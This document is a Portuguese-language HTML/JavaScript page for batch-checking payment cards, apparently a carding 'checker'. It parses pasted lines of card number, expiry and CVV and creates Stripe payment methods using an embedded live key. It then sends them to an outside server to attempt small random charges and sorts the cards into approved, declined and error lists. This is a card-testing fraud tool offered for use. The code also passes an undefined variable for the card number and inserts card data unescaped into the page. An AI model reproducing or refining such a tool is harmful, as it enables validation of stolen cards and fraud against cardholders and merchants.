<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Processamento de Cartões</title>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    textarea { width: 100%; height: 200px; }
    button { padding: 10px; margin: 5px; }
    #iniciarBtn { background-color: green; color: white; }
    #pararBtn { background-color: red; color: white; }
    #pausarBtn { background-color: yellow; }
    .aba { border: 1px solid #ccc; padding: 10px; margin-top: 10px; }
    #aprovados { background-color: lightgreen; }
    #reprovados { background-color: lightcoral; }
    #erros { background-color: lightyellow; }
  </style>
</head>
<body>
  <textarea id="cartoes"></textarea><br>
  <button id="iniciarBtn">Iniciar</button>
  <button id="pararBtn">Parar</button>
  <button id="pausarBtn">Pausar</button>

  <div id="aprovados" class="aba"><h2>Aprovados</h2><ul id="listaAprovados"></ul></div>
  <div id="reprovados" class="aba"><h2>Reprovados</h2><ul id="listaReprovados"></ul></div>
  <div id="erros" class="aba"><h2>Erros</h2><ul id="listaErros"></ul></div>

  <script>
    const stripe = Stripe("pk_live_51R1BLCFMTCrh72HkN23f1mf1kcFo1aQIydknl26DXCOsg888WkhcoDcxyKfElSucgvhMxkEdfDFqUdFCbsPi8Csn00CBeL4Vb7");
    let cartoes = [];
    let processando = false;
    let pausado = false;

    document.getElementById("iniciarBtn").addEventListener("click", iniciarProcessamento);
    document.getElementById("pararBtn").addEventListener("click", pararProcessamento);
    document.getElementById("pausarBtn").addEventListener("click", pausarProcessamento);

    async function iniciarProcessamento() {
      if (processando) return;
      processando = true;
      cartoes = document.getElementById("cartoes").value.split("\n").filter(c => c.trim() !== "");
      if (cartoes.length > 100) { alert("Máximo de 100 cartões!"); return; }
      for (const cartao of cartoes) {
        if (!processando) break;
        if (pausado) { await aguardarDespausar(); }
        await processarCartao(cartao);
      }
      processando = false;
    }

    function pararProcessamento() { processando = false; }
    function pausarProcessamento() { pausado = !pausado; }
    function aguardarDespausar() { return new Promise(resolve => { const interval = setInterval(() => { if (!pausado) { clearInterval(interval); resolve(); } }, 100); }); }

    async function processarCartao(cartao) {
      const [numero, mes, ano, cvv] = cartao.split("|");
      const valor = Math.floor(Math.random() * (2000 - 1000 + 1)) + 1000; // Valor aleatório em centavos
      try {
        const { paymentMethod, error } = await stripe.createPaymentMethod({ type: "card", card: { number, exp_month: mes, exp_year: ano, cvc: cvv } });
        if (error) { adicionarResultado("erros", cartao); } else {
          const response = await fetch("https://chkfull.onrender.com/processar-pagamento", {
            method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ paymentMethod: paymentMethod.id, amount: valor }),
          });
          const data = await response.json();
          adicionarResultado(data.success ? "aprovados" : "reprovados", cartao);
        }
      } catch (err) { adicionarResultado("erros", cartao); }
    }

    function adicionarResultado(aba, cartao) {
      document.getElementById(`lista${aba.charAt(0).toUpperCase() + aba.slice(1)}`).innerHTML += `<li>${cartao}</li>`;
      document.getElementById("cartoes").value = document.getElementById("cartoes").value.replace(cartao + "\n", "");
    }
  </script>
</body>
</html>
